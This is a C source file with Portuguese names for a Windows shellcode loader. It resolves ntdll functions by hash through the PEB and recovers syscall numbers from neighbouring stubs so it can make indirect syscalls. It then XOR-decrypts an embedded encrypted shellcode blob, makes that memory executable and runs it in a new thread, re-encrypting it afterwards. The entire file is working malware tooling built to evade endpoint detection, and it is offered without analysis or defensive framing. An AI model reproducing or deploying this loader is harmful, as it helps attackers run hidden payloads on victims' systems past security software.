#include "structs.h"

static __inline__ void *__readgsqword_pic(void) {
  void *val;
  __asm__ volatile("movq %%gs:0x60, %0" : "=r"(val));
  return val;
}

// --- Hashes de DLLs (Wide String / wchar_t) ---
#define HASH_NTDLL_DLL 0x22D3B5EDUL

// --- Hashes de Funcoes (ANSI String / char) ---
#define HASH_NTALLOCATEVIRTUALMEMORY 0xC66D2FCCUL
#define HASH_NTWRITEVIRTUALMEMORY 0x1423FC12UL
#define HASH_NTCREATETHREADEX 0x41F2B1B0UL
#define HASH_NTWAITFORSINGLEOBJECT 0x5B5856DCUL
#define HASH_NTPROTECTVIRTUALMEMORY 0x191EC748UL

void aplicar_xor(unsigned char *data, size_t data_len, const unsigned char *key,
                 size_t key_len) {
  if (!data || !key || key_len == 0)
    return;

  size_t indice_chave = 0;

  for (size_t i = 0; i < data_len; i++) {

    data[i] = data[i] ^ key[indice_chave];

    indice_chave++;

    if (indice_chave == key_len) {
      indice_chave = 0;
    }
  }
}

// Hash djb2 para Wide Strings (nomes de DLLs) - case-insensitive
DWORD HashStringW(const wchar_t *str) {
  DWORD hash = 5381;
  wchar_t c;
  while ((c = *str++)) {
    if (c >= L'A' && c <= L'Z')
      c += 32;
    hash = ((hash << 5) + hash) + (DWORD)c;
  }
  return hash;
}

// Hash djb2 para ANSI Strings (nomes de funcoes) - case-insensitive
DWORD HashStringA(const char *str) {
  DWORD hash = 5381;
  char c;
  while ((c = *str++)) {
    if (c >= 'A' && c <= 'Z')
      c += 32;
    hash = ((hash << 5) + hash) + (unsigned char)c;
  }
  return hash;
}

PVOID EnderecoDLL(DWORD hashDll) {
  PMY_PEB pPeb = (PMY_PEB)__readgsqword_pic();
  PLIST_ENTRY pHead = &pPeb->Ldr->InLoadOrderModuleList;
  PLIST_ENTRY pCurr = pHead->Flink;

  while (pCurr != pHead) {
    PMY_LDR_DATA_TABLE_ENTRY pEntry = (PMY_LDR_DATA_TABLE_ENTRY)pCurr;

    if (pEntry->BaseDllName.Buffer != NULL) {
      if (HashStringW(pEntry->BaseDllName.Buffer) == hashDll) {
        return pEntry->DllBase;
      }
    }

    pCurr = pCurr->Flink;
  }

  return NULL;
}

PVOID EnderecoFuncao(PVOID baseAddress, DWORD hashFuncao) {
  if (!baseAddress)
    return NULL;

  PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)baseAddress;
  PIMAGE_NT_HEADERS64 pNtHeaders =
      (PIMAGE_NT_HEADERS64)((BYTE *)baseAddress + pDosHeader->e_lfanew);

  DWORD exportRVA = pNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress;
  if (exportRVA == 0)
    return NULL;

  PIMAGE_EXPORT_DIRECTORY pExportDir =
      (PIMAGE_EXPORT_DIRECTORY)((BYTE *)baseAddress + exportRVA);

  DWORD *pAddressOfNames =
      (DWORD *)((BYTE *)baseAddress + pExportDir->AddressOfNames);
  DWORD *pAddressFunctions =
      (DWORD *)((BYTE *)baseAddress + pExportDir->AddressOfFunctions);
  WORD *pAddressOfNameOrdinals =
      (WORD *)((BYTE *)baseAddress + pExportDir->AddressOfNameOrdinals);

  for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
    char *nomeAtual = (char *)((BYTE *)baseAddress + pAddressOfNames[i]);

    if (HashStringA(nomeAtual) == hashFuncao) {
      WORD ordinal = pAddressOfNameOrdinals[i];
      PVOID pEnderecoReal =
          (PVOID)((BYTE *)baseAddress + pAddressFunctions[ordinal]);
      return pEnderecoReal;
    }
  }

  return NULL;
}

PVOID AcharSyscall(PVOID pFuncao) {
  BYTE *pBytes = (BYTE *)pFuncao;

  for (int i = 0; i < 64; i++) {
    if (pBytes[i] == 0x0F && pBytes[i + 1] == 0x05) {
      return (PVOID)&pBytes[i];
    }
  }
  return NULL;
}

static int StubEhLimpo(PVOID pFuncao) {
  BYTE *p = (BYTE *)pFuncao;
  return (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8);
}

DWORD ExtrairSSN(PVOID baseAddress, DWORD hashFuncao) {
  PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)baseAddress;
  PIMAGE_NT_HEADERS64 pNtHeaders =
      (PIMAGE_NT_HEADERS64)((BYTE *)baseAddress + pDosHeader->e_lfanew);
  DWORD exportRVA = pNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress;
  PIMAGE_EXPORT_DIRECTORY pExportDir =
      (PIMAGE_EXPORT_DIRECTORY)((BYTE *)baseAddress + exportRVA);

  DWORD *pAddressOfNames =
      (DWORD *)((BYTE *)baseAddress + pExportDir->AddressOfNames);
  DWORD *pAddressFunctions =
      (DWORD *)((BYTE *)baseAddress + pExportDir->AddressOfFunctions);
  WORD *pAddressOfNameOrdinals =
      (WORD *)((BYTE *)baseAddress + pExportDir->AddressOfNameOrdinals);

  int idxAlvo = -1;
  for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
    char *nome = (char *)((BYTE *)baseAddress + pAddressOfNames[i]);
    if (HashStringA(nome) == hashFuncao) {
      idxAlvo = (int)i;
      break;
    }
  }
  if (idxAlvo == -1)
    return 0;

  WORD ordinalAlvo = pAddressOfNameOrdinals[idxAlvo];
  PVOID pAlvo = (PVOID)((BYTE *)baseAddress + pAddressFunctions[ordinalAlvo]);

  if (StubEhLimpo(pAlvo)) {
    return (DWORD) * ((WORD *)((BYTE *)pAlvo + 4));
  }

  for (int delta = 1; delta <= 50; delta++) {

    if (idxAlvo - delta >= 0) {
      WORD ordUp = pAddressOfNameOrdinals[idxAlvo - delta];
      PVOID pUp = (PVOID)((BYTE *)baseAddress + pAddressFunctions[ordUp]);
      if (StubEhLimpo(pUp)) {
        WORD ssnVizinho = *((WORD *)((BYTE *)pUp + 4));
        return (DWORD)(ssnVizinho + delta);
      }
    }

    if (idxAlvo + delta < (int)pExportDir->NumberOfNames) {
      WORD ordDown = pAddressOfNameOrdinals[idxAlvo + delta];
      PVOID pDown = (PVOID)((BYTE *)baseAddress + pAddressFunctions[ordDown]);
      if (StubEhLimpo(pDown)) {
        WORD ssnVizinho = *((WORD *)((BYTE *)pDown + 4));
        return (DWORD)(ssnVizinho - delta);
      }
    }
  }

  return 0;
}

extern void ConfigurarSyscall(DWORD ssn, PVOID pSyscall);

extern LONG ReservarMemoria(PVOID ProcessHandle, PVOID *BaseAddress,
                            QWORD ZeroBits, QWORD *RegionSize,
                            DWORD AllocationType, DWORD Protect);

extern LONG EscreverMemoria(PVOID ProcessHandle, PVOID BaseAddress,
                            PVOID Buffer, ULONG NumberOfBytesToWrite,
                            ULONG *NumberOfBytesWritten);

extern LONG CriarThread(PVOID *ThreadHandle, DWORD DesiredAccess,
                        PVOID ObjectAttributes, PVOID ProcessHandle,
                        PVOID StartAddress, PVOID Argument, DWORD CreateFlags,
                        QWORD ZeroBits, QWORD StackSize, QWORD MaximumStackSize,
                        PVOID AttributeList);

extern LONG AguardarObjeto(PVOID Handle, BYTE Alertable, PVOID Timeout);

extern LONG ProtegerMemoria(PVOID ProcessHandle, PVOID *BaseAddress,
                            QWORD *NumberOfBytesToProtect,
                            DWORD NewAccessProtection,
                            DWORD *OldAccessProtection);

void pic_entry() {

  PVOID baseAddress = EnderecoDLL(HASH_NTDLL_DLL);
  if (baseAddress == NULL)
    return;

  PVOID pEnderecoFuncao =
      EnderecoFuncao(baseAddress, HASH_NTALLOCATEVIRTUALMEMORY);
  if (pEnderecoFuncao == NULL)
    return;

  DWORD ssn = ExtrairSSN(baseAddress, HASH_NTALLOCATEVIRTUALMEMORY);
  PVOID pSyscall = AcharSyscall(pEnderecoFuncao);
  ConfigurarSyscall(ssn, pSyscall);

  PVOID pMemoria = NULL;
  QWORD tamanho = 4096;

  LONG status = ReservarMemoria((PVOID)-1, &pMemoria, 0, &tamanho,
                                0x3000, // MEM_COMMIT | MEM_RESERVE
                                0x04    // PAGE_READWRITE
  );
  if (status != 0)
    return;

  pEnderecoFuncao = EnderecoFuncao(baseAddress, HASH_NTWRITEVIRTUALMEMORY);
  if (pEnderecoFuncao == NULL)
    return;

  ssn = ExtrairSSN(baseAddress, HASH_NTWRITEVIRTUALMEMORY);
  pSyscall = AcharSyscall(pEnderecoFuncao);
  ConfigurarSyscall(ssn, pSyscall);

  unsigned char shellcode[] = {
      0x1d, 0x9b, 0xc2, 0x9b, 0xd3, 0xf8, 0x17, 0xca, 0x58, 0x75, 0xeb, 0x6b,
      0x1d, 0x21, 0x66, 0xde, 0xd7, 0xf8, 0x5b, 0xe7, 0x9b, 0xf7, 0xd6, 0xf8,
      0x1c, 0x8a, 0xfb, 0x9d, 0xda, 0xf8, 0x1c, 0x96, 0x5d, 0xcf, 0x64, 0x32,
      0xe2, 0x22, 0x5d, 0xff, 0x54, 0x3a, 0x54, 0x65, 0x55, 0x75, 0xa4, 0x3e,
      0x54, 0x65, 0x51, 0x75, 0xd4, 0x6b, 0x10, 0x21, 0x67, 0xde, 0xd6, 0x72,
      0x9b, 0x49, 0x2f, 0x01, 0x52, 0x3b, 0x64, 0x5c, 0x51, 0x75, 0xaf, 0xfd,
      0x19, 0xab, 0xde, 0xb6, 0xaa, 0xb3, 0x1d, 0x9b, 0xc2, 0x02, 0x37, 0xf7,
      0x95, 0xde, 0x17, 0x3f, 0x51, 0x7e, 0x54, 0x68, 0xfb, 0x0a, 0xdf, 0x4a,
      0x97, 0xdf, 0xca, 0xbb, 0x10, 0x24, 0x71, 0xe7, 0x11, 0x34, 0xda, 0x7c,
      0xe2, 0xa6, 0x5a, 0xbb, 0x10, 0x2c, 0x49, 0xe7, 0x11, 0x35, 0xda, 0xf8,
      0x51, 0x21, 0x5c, 0xff, 0x53, 0xb0, 0x96, 0xeb, 0xa8, 0x66, 0x65, 0xf9,
      0x5b, 0x42, 0x82, 0x01, 0x64, 0x8c, 0x1d, 0x9b, 0xd9, 0xaf, 0xd3, 0xca,
      0x36, 0xcb, 0x7c, 0x9d, 0xb5, 0x16, 0x2d, 0xcf, 0x41, 0xb6, 0x16, 0x7f,
      0x71, 0xe2, 0x21, 0x2c, 0xd3, 0x8c, 0x97, 0xe2, 0x93, 0x12, 0xb3, 0x8c,
      0x85};
  ULONG bytesEscritos = 0;

  unsigned char chave[] = {0x55, 0xAA, 0x10, 0xFE, 0x9B, 0x73};

  size_t tam_chave = sizeof(chave);

  LONG status2 = EscreverMemoria((PVOID)-1, pMemoria, shellcode,
                                 sizeof(shellcode), &bytesEscritos);
  if (status2 != 0)
    return;

  aplicar_xor((unsigned char *)pMemoria, sizeof(shellcode), chave, tam_chave);

  pEnderecoFuncao = EnderecoFuncao(baseAddress, HASH_NTPROTECTVIRTUALMEMORY);
  if (pEnderecoFuncao == NULL)
    return;

  ssn = ExtrairSSN(baseAddress, HASH_NTPROTECTVIRTUALMEMORY);
  pSyscall = AcharSyscall(pEnderecoFuncao);
  ConfigurarSyscall(ssn, pSyscall);

  DWORD oldProtect = 0;
  QWORD tamanhoProtect = sizeof(shellcode);
  PVOID pBaseProtect = pMemoria;

  LONG statusProt = ProtegerMemoria((PVOID)-1, &pBaseProtect, &tamanhoProtect,
                                    0x20, // PAGE_EXECUTE_READ
                                    &oldProtect);
  if (statusProt != 0)
    return;

  pEnderecoFuncao = EnderecoFuncao(baseAddress, HASH_NTCREATETHREADEX);
  if (pEnderecoFuncao == NULL)
    return;

  ssn = ExtrairSSN(baseAddress, HASH_NTCREATETHREADEX);
  pSyscall = AcharSyscall(pEnderecoFuncao);
  ConfigurarSyscall(ssn, pSyscall);

  PVOID hThread = NULL;
  LONG status3 = CriarThread(&hThread, 0x1FFFFF, NULL, (PVOID)-1, pMemoria,
                             NULL, 0, 0, 0, 0, NULL);
  if (status3 != 0)
    return;

  pEnderecoFuncao = EnderecoFuncao(baseAddress, HASH_NTWAITFORSINGLEOBJECT);
  if (pEnderecoFuncao == NULL)
    return;

  ssn = ExtrairSSN(baseAddress, HASH_NTWAITFORSINGLEOBJECT);
  pSyscall = AcharSyscall(pEnderecoFuncao);
  ConfigurarSyscall(ssn, pSyscall);

  AguardarObjeto(hThread, 0, NULL);

  pEnderecoFuncao = EnderecoFuncao(baseAddress, HASH_NTPROTECTVIRTUALMEMORY);
  if (pEnderecoFuncao != NULL) {
    ssn = ExtrairSSN(baseAddress, HASH_NTPROTECTVIRTUALMEMORY);
    pSyscall = AcharSyscall(pEnderecoFuncao);
    ConfigurarSyscall(ssn, pSyscall);

    tamanhoProtect = sizeof(shellcode);
    pBaseProtect = pMemoria;
    ProtegerMemoria((PVOID)-1, &pBaseProtect, &tamanhoProtect, 0x04,
                    &oldProtect);

    aplicar_xor((unsigned char *)pMemoria, sizeof(shellcode), chave, tam_chave);
  }
}
